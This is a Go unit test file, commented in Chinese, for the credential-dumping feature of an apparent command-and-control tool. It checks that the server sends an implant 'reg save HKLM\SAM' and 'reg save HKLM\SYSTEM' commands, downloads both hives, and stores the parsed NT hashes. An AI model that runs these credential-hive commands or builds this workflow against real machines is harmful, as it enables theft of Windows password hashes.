// csdev :: v2_hashdump_test.go  --  hashdump 服务端编排的单测
//
// 这里只测编排 (任务组装 / 状态机 / 错误路径); 解析算法本身在
// hashdump_test.go 里覆盖。两条线分开, 出问题能立刻定位是哪一半。
package main

import (
	"csdev/proto"
	"os"
	"strings"
	"testing"
	"time"
)

func newTestSession(id string) *V2Session {
	return &V2Session{ID: id, Impl: "v2", Host: "testhost", Outputs: []Output{}}
}

// 一次 hashdump 必须组装成 [导出 shell][下载 SAM][下载 SYSTEM] 三个任务,
// 顺序不能乱: 导出是同步执行的, 下载排在其后才能拿到文件。
func TestV2SendHashdumpQueuesExportThenTwoDownloads(t *testing.T) {
	sess := newTestSession("T001")
	if _, err := v2SendHashdump(sess, "hashdump"); err != nil {
		t.Fatalf("v2SendHashdump 报错: %v", err)
	}

	sess.mu.Lock()
	q := append([]*proto.Task(nil), sess.Queue...)
	sess.mu.Unlock()

	if len(q) != 3 {
		t.Fatalf("应入队 3 个任务, 实得 %d 个", len(q))
	}

	// 1) 导出命令
	if q[0].Class != cmdExecShell {
		t.Errorf("第 1 个任务应为 shell, 实得 0x%02x", q[0].Class)
	}
	exportArg := string(q[0].Arg)
	for _, want := range []string{`reg save HKLM\SAM`, `reg save HKLM\SYSTEM`, hdSamRemote, hdSysRemote} {
		if !strings.Contains(exportArg, want) {
			t.Errorf("导出命令缺少 %q, 实得: %s", want, exportArg)
		}
	}
	// %TEMP% 不能出现在回传路径里: 植入体用原生 CreateFileA 打开文件,
	// 不展开环境变量, 中文系统下还可能含中文用户名
	if strings.Contains(exportArg, "%TEMP%") {
		t.Errorf("导出命令不应使用 %%TEMP%%: %s", exportArg)
	}

	// 2)(3) 两个下载任务, arg 就是远端路径 (noteDownloadNames 靠它命名落盘)
	if q[1].Class != cmdFileDL || string(q[1].Arg) != hdSamRemote {
		t.Errorf("第 2 个任务应为下载 %s, 实得 class=0x%02x arg=%q",
			hdSamRemote, q[1].Class, string(q[1].Arg))
	}
	if q[2].Class != cmdFileDL || string(q[2].Arg) != hdSysRemote {
		t.Errorf("第 3 个任务应为下载 %s, 实得 class=0x%02x arg=%q",
			hdSysRemote, q[2].Class, string(q[2].Arg))
	}

	// 状态机进入等待态
	sess.hdMu.Lock()
	run := sess.hdRun
	sess.hdMu.Unlock()
	if run == nil {
		t.Fatal("应进入 hashdump 等待态")
	}
}

// 别名 sam 等价于 hashdump; 带参数时仍被识别, 由 v2SendHashdump 拒绝
func TestIsHashdumpCommandAliases(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"hashdump", true},
		{"HASHDUMP", true},
		{"HashDump", true},
		{"sam", true},
		{"SAM", true},
		{"  sam  ", true},
		{"sam ", true},
		{"sam -o out.hiv", true}, // 有参数也算命中, 参数校验在 v2SendHashdump
		{"", false},
		{"   ", false},
		{"sam2", false},
				{"hashdump2", false},
		{"HASHDDUMP", false}, // 近似拼写但不是 hashdump
		{"ls", false},
		{"ps", false},
		{"hash", false},
		{"sams", false},
	}
	for _, c := range cases {
		if got := isHashdumpCommand(c.in); got != c.want {
			t.Errorf("isHashdumpCommand(%q) = %v, 期望 %v", c.in, got, c.want)
		}
	}
}

func TestV2SendHashdumpRejectsExtraArgs(t *testing.T) {
	sess := newTestSession("T002")
	if _, err := v2SendHashdump(sess, "hashdump --all"); err == nil {
		t.Fatal("带参数应报错")
	}
	sess.hdMu.Lock()
	run := sess.hdRun
	sess.hdMu.Unlock()
	if run != nil {
		t.Fatal("参数错误时不应留下等待态")
	}
}

// 上一轮还在等 hive 时必须拒绝第二次下发, 否则两个回传会互相覆盖
func TestV2SendHashdumpRejectsConcurrentRun(t *testing.T) {
	sess := newTestSession("T003")
	if _, err := v2SendHashdump(sess, "hashdump"); err != nil {
		t.Fatalf("第一次下发失败: %v", err)
	}
	if _, err := v2SendHashdump(sess, "hashdump"); err == nil {
		t.Fatal("第二次下发应被拒绝")
	}
}

// 超时后允许重新开始 (目标机权限不足时下载永远等不到, 不能把会话卡死)
func TestV2SendHashdumpAllowsRetryAfterTimeout(t *testing.T) {
	sess := newTestSession("T004")
	if _, err := v2SendHashdump(sess, "hashdump"); err != nil {
		t.Fatal(err)
	}
	sess.hdMu.Lock()
	sess.hdRun.startAt = time.Now().Add(-hdTimeout - time.Minute)
	sess.hdMu.Unlock()

	if _, err := v2SendHashdump(sess, "hashdump"); err != nil {
		t.Fatalf("超时后应允许重新下发: %v", err)
	}
}

// 只回来一个 hive 不能触发解析
func TestHashdumpOnDownloadWaitsForBothHives(t *testing.T) {
	sess := newTestSession("T005")
	if _, err := v2SendHashdump(sess, "hashdump"); err != nil {
		t.Fatal(err)
	}

	fired := make(chan [2]int, 1)
	prev := hashdumpFinishHook
	hashdumpFinishHook = func(_ *V2Session, sam, sys []byte) {
		fired <- [2]int{len(sam), len(sys)}
	}
	defer func() { hashdumpFinishHook = prev }()

	hashdumpOnDownload(sess, hdSamRemote, []byte("regf-sam"))
	sess.hdMu.Lock()
	run := sess.hdRun
	sess.hdMu.Unlock()
	if run == nil {
		t.Fatal("只回来 SAM 时不应结束等待态")
	}
	select {
	case <-fired:
		t.Fatal("只回来一个 hive 就触发了解析")
	case <-time.After(150 * time.Millisecond):
	}

	hashdumpOnDownload(sess, hdSysRemote, []byte("regf-system"))
	select {
	case got := <-fired:
		if got[0] != len("regf-sam") || got[1] != len("regf-system") {
			t.Fatalf("解析收到的数据长度不对: %v", got)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("两个 hive 到齐后没有触发解析")
	}

	sess.hdMu.Lock()
	run = sess.hdRun
	sess.hdMu.Unlock()
	if run != nil {
		t.Fatal("解析触发后应清空等待态")
	}
}

// 不属于 hashdump 的下载 (普通 download 命令) 不能干扰状态机
func TestHashdumpOnDownloadIgnoresUnrelatedFiles(t *testing.T) {
	sess := newTestSession("T006")
	if _, err := v2SendHashdump(sess, "hashdump"); err != nil {
		t.Fatal(err)
	}
	hashdumpOnDownload(sess, `C:\Users\x\Desktop\a.txt`, []byte("hello"))
	hashdumpOnDownload(sess, `C:\Windows\Temp\csdev_x.hiv`, []byte("other"))

	sess.hdMu.Lock()
	run := sess.hdRun
	sess.hdMu.Unlock()
	if run == nil {
		t.Fatal("无关文件不应结束等待态")
	}
	if run.samData != nil || run.sysData != nil {
		t.Fatal("无关文件不应被记成 hive")
	}
}

// 没有进行中的 hashdump 时, 任何下载都不该触发解析
func TestHashdumpOnDownloadNoopWithoutRun(t *testing.T) {
	sess := newTestSession("T007")
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("无等待态时发生 panic: %v", r)
		}
	}()
	hashdumpOnDownload(sess, hdSamRemote, []byte("x"))
	hashdumpOnDownload(sess, hdSysRemote, []byte("y"))
}

// 非 hive 数据必须被明确拒绝, 且不能写进凭据库
func TestV2FinishHashdumpRejectsNonHive(t *testing.T) {
	sess := newTestSession("T008")
	before := len(storeCreds())

	v2FinishHashdump(sess, []byte("not a hive at all"), []byte("also not"))

	if got := len(storeCreds()); got != before {
		t.Fatalf("非 hive 数据不应入库, 凭据数从 %d 变成 %d", before, got)
	}
	sess.mu.Lock()
	outs := sess.Outputs
	sess.mu.Unlock()
	if len(outs) == 0 {
		t.Fatal("失败时必须向会话输出报错, 不能静默")
	}
}

// 真实的 hive 走完整链路: 解析成功并把真实哈希入库 (CredK=2)
func TestV2FinishHashdumpRealHiveStoresCredentials(t *testing.T) {
	samPath, sysPath, ok := realHivePaths()
	if !ok {
		t.Skip("跳过: 没有真实 hive 样本")
	}
	samB, err := os.ReadFile(samPath)
	if err != nil {
		t.Fatal(err)
	}
	sysB, err := os.ReadFile(sysPath)
	if err != nil {
		t.Fatal(err)
	}

	sess := newTestSession("T009")
	before := len(storeCreds())
	v2FinishHashdump(sess, samB, sysB)
	after := storeCreds()

	if len(after) <= before {
		t.Fatal("真实 hive 应至少入库一条凭据")
	}
	for _, c := range after[before:] {
		if c.CredK != 2 {
			t.Errorf("hashdump 入库的凭据 CredK 应为 2 (哈希), 实得 %d", c.CredK)
		}
		if c.Source != "hashdump" {
			t.Errorf("Source 应为 hashdump, 实得 %q", c.Source)
		}
		if len(c.Secret) != 32 {
			t.Errorf("%s 的 NT 哈希长度应为 32, 实得 %d", c.User, len(c.Secret))
		}
		if c.SID != "T009" {
			t.Errorf("SID 应为 T009, 实得 %q", c.SID)
		}
	}
}
